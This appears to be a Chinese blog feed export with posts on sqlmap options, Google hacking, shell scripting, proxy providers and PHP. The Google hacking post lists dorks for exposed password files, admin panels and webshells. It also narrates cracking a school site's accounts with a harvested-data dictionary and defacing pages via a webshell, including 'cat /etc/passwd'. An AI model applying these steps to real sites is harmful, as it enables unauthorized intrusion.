正则表达式排除网页抓取​--csv-del=CSVDEL Delimiting character used in CSV output (default ",")## 分隔CSV输出中使用的字符​--dump-format=DU.. Format of dumped data (CSV (default), HTML or SQLITE)## 转储数据的格式​--eta Display for each output the estimated time of arrival## 显示每个输出的预计到达时间​--flush-session Flush session files for current target## 刷新当前目标的会话文件​--forms Parse and test forms on target URL## 在目标网址上解析和测试表单​--fresh-queries Ignore query results stored in session file## 忽略在会话文件中存储的查询结果​--hex Use DBMS hex function(s) for data retrieval## 使用DBMS hex函数进行数据检索​--output-dir=OUT.. Custom output directory path## 自定义输出目录路径​--parse-errors Parse and display DBMS error messages from responses## 解析和显示响应中的DBMS错误消息​--save=SAVECONFIG Save options to a configuration INI file## 保存选项到INI配置文件​--scope=SCOPE Regexp to filter targets from provided proxy log## 使用正则表达式从提供的代理日志中过滤目标​--test-filter=TE.. Select tests by payloads and/or titles (e.g. ROW)## 根据有效负载和/或标题(e.g. ROW)选择测试​--test-skip=TEST.. Skip tests by payloads and/or titles (e.g. BENCHMARK)## 根据有效负载和/或标题跳过测试（e.g. BENCHMARK）​--update Update sqlmap## 更新SqlMap Miscellaneous（杂项）12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152Miscellaneous（杂项）:​-z MNEMONICS Use short mnemonics (e.g. "flu,bat,ban,tec=EU")## 使用简短的助记符​--alert=ALERT Run host OS command(s) when SQL injection is found## 在找到SQL注入时运行主机操作系统命令​--answers=ANSWERS Set question answers (e.g. "quit=N,follow=N")## 设置问题答案​--beep Beep on question and/or when SQL injection is found## 发现SQL 注入时提醒​--cleanup Clean up the DBMS from sqlmap specific UDF and tables SqlMap## 具体的UDF和表清理DBMS​--dependencies Check for missing (non-core) sqlmap dependencies## 检查是否缺少（非内核）sqlmap依赖关系​--disable-coloring Disable console output coloring## 禁用控制台输出颜色​--gpage=GOOGLEPAGE Use Google dork results from specified page number## 使用Google dork结果指定页码​--identify-waf Make a thorough testing for a WAF/IPS/IDS protection## 对WAF / IPS / IDS保护进行全面测试​--skip-waf Skip heuristic detection of WAF/IPS/IDS protection## 跳过启发式检测WAF / IPS / IDS保护​--mobile Imitate smartphone through HTTP User-Agent header## 通过HTTP User-Agent标头模仿智能手机​--offline Work in offline mode (only use session data)## 在离线模式下工作（仅使用会话数据）​--page-rank Display page rank (PR) for Google dork results## Google dork结果显示网页排名（PR）​--purge-output Safely remove all content from output directory## 安全地从输出目录中删除所有内容​--smart Conduct thorough tests only if positive heuristic(s)## 只有在正启发式时才进行彻底测试​--sqlmap-shell Prompt for an interactive sqlmap shell## 提示交互式 sqlmap shell​--wizard Simple wizard interface for beginner users## 给初级用户的简单向导界面]]></content>
      <categories>
        <category>hacker</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GoogleHacking]]></title>
    <url>%2F2019%2F9%2FGoogleHacking%2F</url>
    <content type="text"><![CDATA[前言Google hacker (Google黑客)是利用GOOGLE提供的搜索功能查找黑客们想找到的信息，一般是查找网站后台，网管的个人信息，也可以用来查找某人在网络上的活动 Google hacker 一般是做为黑客在入侵时的一个手段，在入侵过程中有时需要查找后台的登陆口就需要用到GOOGLE HACKER，有时猜解密码的时候google也是提供查找管理员资料的有效平台 常用语法intext这个就是把网页中的正文内容中的某个字符做为搜索条件，例如在google里输入intext:动漫，将返回所有在网页正文部分包含”动漫”的网页，allintext:使用方法和intext类似 intitle和intext差不多，搜索网页标题中是否有所要找的字符，例如搜索:intitle:安全天使，将返回所有网页标题中包含”安全天使”的网页，同理allintitle:也同intitle类似 cache搜索google里关于某些内容的缓存，也许能找到一些好东西 define搜索某个词语的定义，搜索:define:hacker，将返回关于hacker的定义 filetype搜索指定类型的文件，撒网式攻击还是对特定目标进行信息收集都需要用到这个，例如输入:filetype:doc，将返回所有以doc结尾的文件URL，如果找.bak、.mdb或.inc也是可以的，获得的信息也许会更丰富 info查找指定站点的一些基本信息 inurl搜索:inurl:www.123.net可以返回所有和www.123.net做了链接的URL site搜索:site:www.123.net，将返回所有和123.net这个站有关的URL 还有一些操作符也是很有用的: 1234567– 把某个字忽略~ 同意词. 单一的通配符“” 精确查询 典型用法 找管理后台地址 12345site:xxx.com intext：管理后台登陆用户名密码系統账号site:xxx.com inurl: login/admin/manage/manager/adminlogin/system site:xxx.com intitle 管理后台登陆 找上传类漏洞地址： 123site:xxx.com inurl:file site:xxx.com inurl:upload 找注入页面 1site:xxx.com inurl:php?id= 找编辑器页面 1site:xxx.com inurl:ewebeditor 实际应用对于攻击者来说，可能最感兴趣的就是密码文件了，而google正因为其强大的搜索能力往往会把一些敏感信息透露出来，用google搜索以下内容 123456789101112131415161718192021intitle:”index of” etcintitle:”Index of” .sh_historyintitle:”Index of” .bash_historyintitle:”index of” passwdintitle:”index of” people.lstintitle:”index of” pwd.dbintitle:”index of” etc/shadowintitle:”index of” spwdintitle:”index of” master.passwdintitle:”index of” htpasswd“# -FrontPage-” inurl:service.pwd 同样可以用google来搜索一些具有漏洞的程序，例如ZeroBoard前段时间发现个文件代码泄露漏洞，我们可以用google来找网上使用这套程序的站点: 1intext:ZeroBoard filetype:php 或者使用: 1inurl: outlogin.php?_zb_path= site:.jp phpmyadmin是一套功能强大的数据库操作软件，一些站点由于配置失误，导致可以不使用密码直接对phpmyadmin进行操作，可以用google搜索存在这样漏洞的程序 1intitle:phpmyadmin intext:Create new database 可以用google来搜索数据库文件，用上一些语法来精确查找能够获得更多东西(access的数据库,mssql、mysql的连接文件等等) 123456789allinurl:bbs datafiletype:mdb inurl:databasefiletype:inc conninurl:data filetype:mdbintitle:”index of” data //在一些配置不正确的apache+win32的服务器上经常出现这种情况 实战演示利用google完全是可以对一个站点进行信息收集和渗透的，下面用google对特定站点进行一次测试 首先用google先看这个站点的一些基本情况 1site:xxxx.com 从返回的信息中，找到几个该校的几个系院的域名： 1234567http://a1.xxxx.comhttp://a2.xxxx.comhttp://a3.xxxx.comhttp://a4.xxxx.com 顺便ping了一下，应该是在不同的服务器，学校一般都会有不少好的资料 1site:xxxx.com filetype:doc 得到N个不错的doc。先找找网站的管理后台地址： 12345site:xxxx.com intext:管理site:xxxx.com inurl:loginsite:xxxx.com intitle:管理 超过获得2个管理后台地址： 123http://a2.xxxx.com/sys/admin_login.asphttp://a3.xxxx.com:88/_admin/login_in.asp 看看服务器上跑的是什么程序： 1234567site:a2.xxxx.com filetype:aspsite:a2.xxxx.com filetype:phpsite:a2.xxxx.com filetype:aspxsite:a3.xxxx.com filetype:asp a2服务器用的应该是IIS，上面用的是asp的整站程序，还有一个php的论坛 a3服务器也是IIS，aspx+asp。web程序都应该是自己开发的。有论坛那就看看能不能遇见什么公共的FTP帐号什么的： 1site:a2.xxxx.com intext:ftp://: 再看看有没有上传一类的漏洞： 123site:a2.xxxx.com inurl:filesite:a3.xxxx.com inurl:load 在a2上发现一个上传文件的页面： 1http://a2.xxxx.com/sys/uploadfile.asp 用IE看了一下，没权限访问。试试注射 1site:a2.xxxx.com filetype:asp 一般学校的站点的密码都比较有规律，通常都是域名+电话一类的变形 12345site:xxxx.com //得到N个二级域名site:xxxx.com intext:@xxxx.com //得到N个邮件地址，还有邮箱的主人的名字什么的site:xxxx.com intext:电话 //N个电话 把这些信息做个字典，挂上慢慢跑。过了一段时间就跑出4个帐号，2个是学生会的，1个管理员，还有一个可能是老师的帐号 google hack其实也都差不多是一些基本语法的灵活运用，或者配合某个脚本漏洞，主要还是靠个人的灵活思维 对于一些在win上跑 apache的应该多注意一下这方面，一个intitle:index of就差不多都出来了 echo “召唤” &gt; index.jsp 现在看看首页，已经被改成: “召唤” 了。 也可以用WGET上传一个文件上去，然后execute Command输入 cat file &gt; index.html or echo “”&gt; file echo “test” &gt;&gt; file 这样一条条打出来，站点首页就成功被替换了 同样的也可以 uname -a;cat /etc/passwd 不过有点要注意，有些WEBSHELL程序有问题，执行不了的， 搜索INC敏感信息在google的搜索框中填入: Code: .org filetype:inc 例：常用的google关键字： foo1 foo2 (也就是关联，比如搜索xx公司 xx美女) operator:foo filetype:123 类型 site:foo.com 相对直接看网站更有意思，可以得到许多意外的信息 intext:foo intitle: fooltitle 标题 allinurl:foo 搜索xx网站的所有相关连接。（踩点必备） links:foo不要说就知道是它的相关链接 allintilte:foo.com 可以辅助”-” “+”来调整搜索的精确程度 直接搜索密码：(引号表示为精确搜索) 可以再延伸到上面的结果里进行二次搜索 “index of” htpasswd / passwd filetype:xls username password email “ws_ftp.log” “config.php” allinurl:admin mdb service filetype:pwd 或者某个比如pcanywhere的密码后缀cif等 再来点更敏感信息 “robots.txt” “Disallow:” filetype:txt inurl:_vti_cnf (FrontPage的关键索引啦，扫描器的CGI库一般都有) allinurl: /msadc/Samples/selector/showcode.asp /../../../passwd /examples/jsp/snp/snoop.jsp phpsysinfo intitle:index of /admin intitle:”documetation” inurl: 5800(vnc的端口) 或者desktop port等多个关键字检索 webmin port 10000 inurl:/admin/login.asp intext: Powered by GBook365 intitle:”php shell” “Enable stderr” filetype:php 直接搜索到phpwebshell 1234567891011121314151617foo.org filetype:incipsec filetype:confintilte:”error occurred” ODBC request where (select|insert) 说白了就是说，可以直接试着查查数据库检索，针对目前流行的sql注射“Dumping data for table” username passwordintitle:”Error using Hypernews”“Server Software”intitle:”HTTP_USER_AGENT=Googlebot”“HTTP_USER_ANGET=Googlebot” THS ADMINfiletype:.doc site:.mil classified 直接搜索军方相关word 检查多个关键字：123456789intitle:config confixx login password“mydomain.com” nessus report“report generated by”“ipconfig”“winipconfig” google缓存利用，搜索时候多”选搜索所有网站” 特别推荐：administrator users 等相关的东西，比如名字，生日等……最惨也可以拿来做字典 一些技巧集合： 1) index.of.password 1) filetype:blt “buddylist” 2) “access denied for user” “using password” 2) intitle:”index of” inurl:ftp (pub | incoming) 3) “http://:@www” domainname 3) filetype:cnf inurl:_vti_pvt access.cnf 4) auth_user_file.txt 4) allinurl:”//_vti_pvt/” | allinurl:”//_vti_cnf/” 5) The Master List 5) inurl:”install/install.php” 6) allinurl: admin mdb 6) intitle:”welcome.to.squeezebox” 7) passlist.txt (a better way) 7) intext:””BiTBOARD v2.0″ BiTSHiFTERS Bulletin Board” 8) “A syntax error has occurred” filetype:ihtml 8) intitle: Login intext:”RT is ? Copyright” 9) “# -FrontPage-” inurl:service.pwd 9) ext:php program_listing intitle:MythWeb.Program.Listing 10) ORA-00921: unexpected end of SQL command 10) intitle:index.of abyss.conf]]></content>
      <categories>
        <category>hacker</category>
      </categories>
      <tags>
        <tag>google</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell编程基础]]></title>
    <url>%2F2019%2F6%2FShll%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[前言Shell的概念是源自Unix的命令解释器。Shell不仅可解释用户输入的命令，同时，可解释执行基于命令的脚本语言。使用shell脚本能提高用户操作和管理员进行系统管理的效率。shell脚本擅长处理纯文本类型的数据，而Linux中几乎所有的配置文件、日志都是纯文本类型。 脚本书写规范12341.脚本统一存放目录2.选择解释器, 开头要写#! XXX,内核根据#!后的解释器来确定用哪个解释器解释脚本内容3.编辑脚本使用vim, 配置~/.vimrc方便个人书写习惯4.文件名规范，结尾以sh结束 shell的基本元素12341.#！/bin/bash 必须的，指出shell的类型2.# 注释。在shell中，注释写在#之后，#之后的内容不会执行3.变量4.控制 循环分支 shell中的特殊符号123456789101112131415161718192021222324252627282930313233343536371.#! 注明执行脚本采用的shell2.$ 变量符。与反斜杠转义符相反，使其后的普通字符作为变量名，如$a表示变量a的值。变量字符长度超过1个时，用&#123;&#125;括起来3.单引号。被引起的字符全部做普通字符，即全部原样echo 'my $SHELL'4.双引号引号内的内容，除$、转义符\、倒引号`这三个保留特殊功能，其他字符均做普通字符。5.倒引号(数字1键旁边的那个键）引号内的字符串当做shell命令行解释执行（同样的功能也可以使用$()来使用），得到的结果取代整个倒引号括起来的部分。6.反斜线反斜线是转义字符，它能把特殊字符变成普通字符。在某个字符前面利用反斜杠（\）能够阻止shell把后面的字符解释为特殊字符。7.* 代表0个或者多个特殊字符例子 yum.* 代表的可以使yum.也可以是yum.a、yum.ab、yum.abc 当然小数点后面可以有多个字母8.? 代表的是任意一个字符例子 yum.? 可以是yum.a yum.b yum.c，但是要注意小数点后面必须有任意一个字符9.[]代表的是中括号中的任意一个[abcdef] 可以是a b c d e f 中的任意一个字母当然也可以是数字[-]代表的是一个范围[a-z] 表示的是字母a到z之间的所有字母[^]^是反向选择符号从字面意思可以知道也就是非的意思[^abc]表示只要不a b c 这三个字符中的任意一个就选择10.$( )可以将命令替换输出赋值给变量11.&#123;&#125;通过括号扩展可以生成需要的字串，括号中可以包含连续的序列或使用逗号分隔的多个项目，连续的序列包括一个起点和一个终点user@computer: ~$ echo &#123;a,b,c&#125; a b cuser@computer: ~$ echo user&#123;1,5,8&#125;user1 user5 user8user@computer: ~$ echo &#123;0..10&#125;0 1 2 3 4 5 6 7 8 9 10user@computer: ~$ mkdir &#123;dir1,dir2,dir3&#125;user@computer: ~$ ls –ld dir&#123;1,2,3&#125; 变量shell变量可以保存路径名、文件名或者一个数字等。分为三类： 123456本地变量: (局部变量)只在创建它们的Shell中使用，可以在shell程序内任意使用和修改它们。环境变量: 可以在创建它们的Shell及其派生出来的任意子程序中使用。有些变量是用户创建的，其他的则是专用的（比如PATH、HOME)。是系统环境的一部分，不必去定义它们，可以在shell程序中使用它们 。还能在shell中加以修改。内部变量: 由系统提供的。与环境变量不同，用户不能修改它们。 本地变量123456789101112131415161718192021222324252627本地变量 在用户现在的shell生命期的脚本中使用 变量名=值1.等号两边不可以有空格2.取值包含空格，必须用双引号括起来3.Shell变量可以用大小写字母，区分大小写变量是弱类型的, 不用声明类型# 变量声明及赋值格式变量=值（等号两边不能有空格）# 变量的引用 $变量名 $&#123;变量名&#125; 变量名为1个字符时建议使用方式一，多余一个字符时建议使用方式二 举例: $a $&#123;abc&#125;# 清除变量unset 变量名user@computer: ~$ name=Jackuser@computer: ~$ echo $&#123;name&#125;user@computer: ~$ unset name # 注意,name前没有$# 设置只读变量设置变量时，不想再改变其值，可以将之设为只读变量 变量名=值 readonly 变量名 环境变量Bash预设了很多环境变量，实际使用中，可以直接调用这些变量。环境变量可以用于所有子程序，着包括编辑器、脚本和应用 内置环境变量 123456789HOME: 代表使用者的家目录。cd ~ 去到使用者的家目录 或者利用 cd 就可以直接回到使用者家目录了。SHELL: 目前这个环境使用的 SHELL 是哪个程序？ 如果是 bash 的话，预设是 /bin/bashPWD：用户当前工作目录的路径。它指出用户目前在Linux文件系统中处在什么位置。它是由Linux自动设置的HISTSIZE: 这个与“历史命令”有关，曾经下达过的指令可以被系统记录下来，而记录的“数目”则是由这个值来设定的。PATH: 就是执行文件搜寻的路径，目录与目录中间以冒号(:)分隔， 由于文件的搜寻是依序由PATH的变量内的目录来查询，所以，目录的顺序也很重要。 1234567891011121314环境变量可以在命令行中设置，但用户注销时这些值将丢失 环境变量均为大写 必须用export命令导出# 设置环境变量variable-name=valueexport variable-name(环境变量名大写)# 显示环境变量env 可以看到所有的环境变量echo $环境变量名 （显示一个变量）# 清除环境变量unset 环境变量名 修改path环境变量 12345678910修改PATH环境变量，使脚本不用加路径，直接输入文件名字即可执行。# 命令行修改环境变量以下在用户user主目录下操作：mkdir shdir &amp;&amp; cd shdirvi hellochmod 755 hellocd ～export PATH=$PATH:$HOME/shdir在任何目录下，输入hello即可执行该文件。本方式下环境变量如果修改错了，exit退出后重新登陆即可恢复系统默认的值。 配置文件中修改环境变量 123456789注意，修改环境变量前最好先备份一下旧的：export tem=$PATHecho $tem &gt;&gt;pathbake需要知道环境变量与哪些配置文件有关：不同发行版会有不同，但命名还是有通性的：find / -name “*profile”find / -name “*bashrc”全局配置文件/etc/profile本地配置文件~/.bashrc 内部变量内部变量是Linux所提供的一种特殊类型的变量，这类变量在程序中用来作出判断。在shell程序内这类变量的值是不能修改的。 123456789部分内部变量是：$# 传送给shell程序的位置参数的数量$? 最后命令的完成码或者在shell程序内部执行的shell程序（返回值）$0 shell程序的名称$* 调用shell程序时所传送的全部参数的单字符串，"参数1", "参数2"…形式保存的参数$@ "参数1", "参数2"…形式保存的参数$n 第n个参数$$ 本程序的PID$! 上一个命令的PID 输入与输出12345678910111213141516# read 从键盘上读取变量的值read [选项] 变量名列表 常用选项 -a ANAME 将输入读入ANAME的数组 -n NCHARS 读入N个字符 -p PROMPT 显示一个提示 -r 取消转移 -s 安静模式，输入的字符将不会提示 -t TIMEOUT 超过指定时间，read自动停止# echo 显示字符串或变量的值echo [选项] 字符串 常用选项 -n 不在最后自动换行 -e 启用反斜线控制字符的转换 -E 不处理转义字符。此为缺省选项； 1234#! /bin/bash# 输入一句话，打印输入的话read -p 'please type some words, I will print them: ' wordsecho $words 条件测试12345678910# testtest 条件表达式如果测试条件为真，test命令会返回0，否则返回一个非0的数值test 语句与if/then和case语句一起，构成shell编程的控制转移结构# [][ 条件表达式 ]方括号的内侧两边各需一个空格条件表达式的值为真返回零，为假时返回非零值 文件状态判断12345678910111213-d filename 若文件filename为目录文件，则返回真-f filename 文件是否存在且为普通文件，则返回真-r filename 若文件filename可读，则返回真-s filename 若文件filename的长度大于0，则返回真-w filename 若文件filename可写，则返回真-x filename 若文件filename可执行，则返回真-e filename 文件是否存在 123456789#! /bin/bash# 输入文件的绝对路径，判断文件是否存在read -p 'input file path: ' fileif [ -e $file ] then echo '文件存在'else echo '文件不存在'fi 条件语句123456789101112131415161718192021222324252627282930if [ 条件表达式 ] then 命令序列1else 命令序列2fi当"条件表达式"的测试值为真时，执行"命令序列1"，否则，执行"命令序列2"。命令序列中的命令可以是一个或者多个。if [ 条件表达式 ]; then 命令序列fi当"条件表达式"的测试值为真时，执行"命令序列",否则，执行条件语句后面的命令。条件表达式与then之间的分号";"起命令分隔符的作用。语法形式三if test 条件表达式1 then 命令序列1elif [ 条件表达式2 ] then 命令序列2else 命令序列3fi这是包含二层嵌套的条件语句，当"条件表达式1"为真时，执行"命令序列1",否则，在"条件表达式2"为真的情况下，执行"命令序列2"，否则，执行"命令序列3","命令序列3"属于第2个条件语句的一部分。 123456789101112#! /bin/bash# 判断输入的路径是文件还是目录read -p 'please input the file path: ' fileif [ -d $file ] then echo 'this is a directory'elif [ -f $file ] then echo 'this is a file'else echo 'wrong file type, or the file do not exist'fi 数字操作符1234567891011n1 –eq n2判断数字n1与n2是否相等，若相等，返回0，否则，返回1n1 –ne n2判断数字n1与n2是否不等，若不等，返回0，否则，返回1n1 –lt n2判断数字n1是否小于n2，若是，返回0，否则，返回1n1 –gt n2判断数字n1是否大于n2，若是，返回0，否则，返回1n1 –le n2判断数字n1是否小于或等于n2，若是，返回0，否则，返回1n1 –ge n2 判断数字n1是否大于或等于n2，若是，返回0，否则，返回1 字符串操作符12345678910111213string 若字符串string非空，则返回真-n string 若字符串string长度大于0，则返回真-z string 若字符串string长度为0，则为返回真string1 = string2 若字符串string1和string2相等，则返回真string1 != string2 若字符串string1和 string2不等，则返回真 逻辑操作符123e1 –a e2 逻辑表达式e1和e2同时为真时，返回0，否则，返回1e1 –o e2 逻辑表达式e1和e2有一个为真时，返回0，否则，返回1! e1 若逻辑表达式e1不为真时，返回0，,否则，返回1 循环语句1234567891011121314151617181920212223for 变量名 in 参数列表 do 命令列表done将"参数列表"中的元素依次赋给"变量名"，在每次赋值后执行"命令列表"，"参数列表"表示"变量名"的取值范围for ((初始化变量值；结束循环条件；运算)) do 命令序列donewhile [ 条件表达式 ] do 命令列表done循环执行"命令列表"中的命令，直至"条件表达式"的值为假。Until [ 条件 ] do 命令序列Done直到条件满足时循环结束 1234567891011121314151617181920212223#! /bin/bash# 将指定目录下(参数传递$1)的所有以.txt为后缀的文件更名为*.docdirectory=$1if [ ! $directory ] then echo "please input the argument directory" exitfifiles=`ls $&#123;directory&#125;`for file in $files; do if [ -f $&#123;file&#125; ] echo $file then suffix=$&#123;file#*\.&#125; echo $suffix if [[ $suffix == "txt" ]] then prefix=$&#123;file%\.*&#125; mv $directory/$file $directory/$prefix.doc fi fidone 函数123456functionname() &#123; 命令列表 return&#125;函数的调用方式为：functionname arguments]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SS/SSR提供商]]></title>
    <url>%2F2019%2F6%2FSS%20SSR%E6%8F%90%E4%BE%9B%E5%95%86%2F</url>
    <content type="text"><![CDATA[前言自己经常用的一些梯子，且用且珍惜 MENGDI-Cloud现已接入台湾HINET中华电信,香港HKT、WTT、HKBN、HGC、阿里云CN2、俄罗斯伯力、韩国KT、SK、LG、azure、新加坡CN2、美国CN2、香港azure、日本IIJ、软银,高达1Gbps数据传输最大全力保证大陆宽带,旗下站点X-AIR主要运营V2ray加速 官方网址：https://wan.sc.cn 喵帕斯极限速度很快，稳定性不错，香港机子比较多 官网： https://www.喵帕斯.com 邀请码可私聊bot： https://t.me/duyao_bot RixCloud全部节点BGP中继阿里云机房（500M/300M/200M） 虽然看起来延迟比直连要高一些，但是实际起速要比直连还快很多，而且稳定 官网：https://bit.ly/2M7G1Rm ssrcloud性价比也很好，部分线路0.1倍率。 180+节点，新增多条BGP线路 网站：https://bit.ly/2IvnxVW MunCloud新增部分阿里云内网专线。总体来说还算不错的一家，性价比不错。60+节点。 网站：https://bit.ly/2QOlRdV 百草园晚高峰测了测，速度还算不错，流量给的也很足 官网：https://bit.ly/2wDqDkX 次元链接也是一家大站了，之前在youtube上见过，人数不少，试了试总体速度还不错，性价比还可以。总节点数90+ 官网：https://k0.pw/vrrno1 SWCloud星愿云试速度还可以，性价比也OK。总节点数50+ 官网： https://bit.ly/2MN614G CTCloud晚高峰的时候测过几天速，还不错，价钱也不贵，性价比还可以，线路大概在40条 官网：https://bit.ly/2K25mcR STC-server不过速度还不错，性价比不错 官网：https://bit.ly/2IsvRFI BigHead一家运营快一年的机场，之前是公益机场，现在主打AZ节点 官网：https://bit.ly/2VPGjM9 TG： https://t.me/BigHeadSSRV2ray Catchflying速度还不错。35+节点 官网：https://bit.ly/2F7O3DH TG： https://t.me/catchflying AAEX大概有45+节点 官网：https://bit.ly/2VRui99 Dler Cloud机场包括部分中继节点，港台日等地区节点也挺多，150+节点，包括国际标准节点、国际高级节点、国际优化节点、中国大陆节点等等。 注册购买: https://dlercloud.io官方网站: https://dlercloud.io]]></content>
      <categories>
        <category>科学上网</category>
      </categories>
      <tags>
        <tag>ssr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP中的错误处理]]></title>
    <url>%2F2019%2F6%2FPHP%E4%B8%AD%E7%9A%84%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%2F</url>
    <content type="text"><![CDATA[前言PHP里有一套错误处理机制，可以使用set_error_handler接管PHP错误处理，也可以使用trigger_error函数主动抛出一个错误。 set_error_handlerset_error_handler()函数设置用户自定义的错误处理函数。函数用于创建运行期间的用户自己的错误处理方法。它需要先创建一个错误处理函数，然后设置错误级别。语法如下： 1set_error_handler(error_function, error_type) error_function :发生错误时运行的函数 error_type : 错误级别，默认为E_ALL 如果使用该函数，会完全绕过PHP错误处理函数，如果有必要，自定义的错误处理程序必须终止脚本 如果在脚本执行前发生错误，那时自定义程序还没有注册，就不会用到自定义错误处理程序 自定义异常处理1234567891011121314&lt;?phpfunction customError($errno, $errstr, $errfile, $errline)&#123; echo '错误代码:'$errno.$errstr; echo '错误所在:'$errfile.$errline;&#125;set_error_handler(customError, E_ALL|E_STRICT);$a = ['o' =&gt; 2,4,5];echo $a['o']; 自定义的错误处理函数一定要有这四个输入变量＄errno、＄errstr、＄errfile、＄errline errno是一组常量，代表错误的等级，同时也有一组整数和其对应，但一般使用其字符串值表示，这样语义更好一点。比如E_WARNING，其二进制掩码为4.，表示警告信息 接下来，就是将这个函数作为回调参数传递给set_error_handler。这样就能接管PHP原生的错误处理函数了。要注意的是，这种托管方式并不能托管所有种类的错误，如E_ERROR、E_PARSE、E_CORE_ERROR、E_CORE_WARNING、E_COMPILE_ERROR、E_COMPILE_WARNING，以及E_STRICT中的部分。这些错误会以最原始的方式显示，或者不显示 restore_error_handlerset_error_handler函数会接管PHP内置的错误处理，可以在同一个页面使用restore_error_handler()；取消接管 如果使用自定义的set_error_handler接管PHP的错误处理，代码里的错误抑制@将失效，这种错误也会被显示 在PHP异常中，异常处理机制是有限的，无法自动抛出异常，必须手动进行，并且内置异常有限。PHP把许多异常看作错误，这样就可以把这些“异常”像错误一样用set_error_handler接管，进而主动抛出异常 12345678910111213141516function customError($errno, $errstr, $errfile, $errline)&#123; throw new Exception($errno.'|'.$errstr);&#125;set_error_handler('customError', E_ALL|E_STRICT);try&#123; $a = 5/0;&#125;catch(Exception $e)&#123; echo $e-&gt;getMessage();&#125; 这样就能捕获到异常和非致命的错误，可以弥补PHP异常处理机制的部分不足 register_shutdown_functionfetal error这样的错误捕获不到，也无法在发生此错误后恢复流程处理，但是还是可以使用一些特殊方法对这种错误进行处理。这需要用到register_shutdown_function() 此函数会在PHP程序终止或者die时触发一个函数 1234567891011121314151617181920&lt;?phpclass Shutdown&#123; public function stop() &#123; if (error_get_last()) &#123; print_r(error_get_last); &#125; die('Stop'); &#125; register_shutdown_function([new Shutdown(), 'stop']); $a = new a(); echo 'end';&#125; 对于fetal error还能做点收尾工作，但是PHP流程的终止是必然的。对于Parse error级别的错误，除了可以修改配置文件php.ini，什么都做不了 12log_errors = Onerror_log = usr/log/php.log 这样一旦PHP发生了错误，就会被记入log文件，方便以后查询 trigger_error和exception类似，错误处理也有对应抛出错误的函数，那就是trigger_error函数 12345678910&lt;?php$d = 0;if ($d == 0) &#123; trigger_error('cannot d by zero', E_USER_ERROR);&#125;echo 'break'; 结语在PHP中，错误和异常是两个不同的概念，这种设计从根本上导致了PHP的异常和其他语言相异。以Java为例，Java中，异常是错误唯一的报告方式。说到底，两者的区别就是对异常和错误的认识不同而产生的。PHP的异常绝大部分必须通过某种办法手动抛出，才能被捕获到，是一种半自动化的异常处理机制。 无论是错误还是异常，都可以使用handler接管系统已有的处理机制]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP类反射]]></title>
    <url>%2F2019%2F6%2FPHP%E7%B1%BB%E5%8F%8D%E5%B0%84%2F</url>
    <content type="text"><![CDATA[前言面向对象编程中对象被赋予了自省的能力，而这个自省的过程就是反射，反射直观的理解就是根据到达地找出出发地和来源 反射指在PHP运行状态中，扩展分析PHP程序，到处或提取出类，方法，属性，参数等详细信息，包括注释 示例123456789101112131415161718192021222324252627282930&lt;?phpclass Person &#123; public $name; public $gender; public function say() &#123; echo $this-&gt;name ':' $this-&gt;gender; &#125; public function __set($name, $value) &#123; echo 'setting $name to $value'; $this-&gt;$name = $value; &#125; public function __get($name) &#123; if (!isset($this-&gt;$name)) &#123; echo '未设置'; $this-&gt;$name = '默认值'; &#125; return $this-&gt;$name; &#125;&#125; 12345$student = new Person();$student-&gt;name = 'Ton';$student-&gt;gender = 'male';$student-&gt;age = '24'; 使用API获取属性和方法1234567891011121314//获取对象属性列表$reflect = new ReflectionObject($student);$props = $reflect-&gt;getProperties();foreach ($props as $prop) &#123; print $prop-&gt;getName();&#125;//获取对象方法列表$m = $reflect-&gt;getMethods();foreach ($m as $prop) &#123; print $prop-&gt;getName();&#125; 使用class函数获取属性和方法123456//返回对象属性的关联数组var_dump(get_object_vars($student));//类属性var_dump(get_class_vars(get_class($student)));//返回由类的方法组成的数组var_dump(get_class_methonds(get_class($student))); 获取对象属于哪个类1echo get_class($student); 还原类原型1234567891011121314151617181920212223242526272829//反射获取类的原型$obj = new ReflectionClass('person');$className = $obj-&gt;getName();$methods = $properties = [];foreach ($obj-&gt;getProperties() as $v) &#123; $properties[$v-&gt;getName()] = $v;&#125;foreach ($obj-&gt;getMethods() as $v) &#123; $methods[$v-&gt;getName()] = $v;&#125;echo "class &#123;$className&#125;";is_array($properties) &amp;&amp; ksort($properties);foreach($properties as $k =&gt; $v) &#123; echo $v-&gt;isPublic ? 'public' : ''; echo $v-&gt;isPrivate ? 'private' : ''; echo $v-&gt;isProtected ? 'protected' : ''; echo $v-&gt;static ? 'static' : '';&#125;if (is_array($methods)) ksort($methods);foreach ($methods as $k =&gt; $v) &#123; echo "function&#123;$k&#125;()&#123;&#125;";&#125; PHP手册关于反射API有几十个，反射完整的描述了一个类或对象的原型，反射不仅可以用于类和对象，还可以用于函数，扩展模块，异常等 结语善用反射能保持代码的优雅和简洁，但反射也会破坏类的封装性，因为反射可以使本不该暴露的方法或属性被强制暴露了出来，是优点也是缺点]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[乐购菠菜添加支付方式]]></title>
    <url>%2F2019%2F6%2F%E4%B9%90%E8%B4%AD%E8%8F%A0%E8%8F%9C%E6%B7%BB%E5%8A%A0%E6%94%AF%E4%BB%98%E6%96%B9%E5%BC%8F%2F</url>
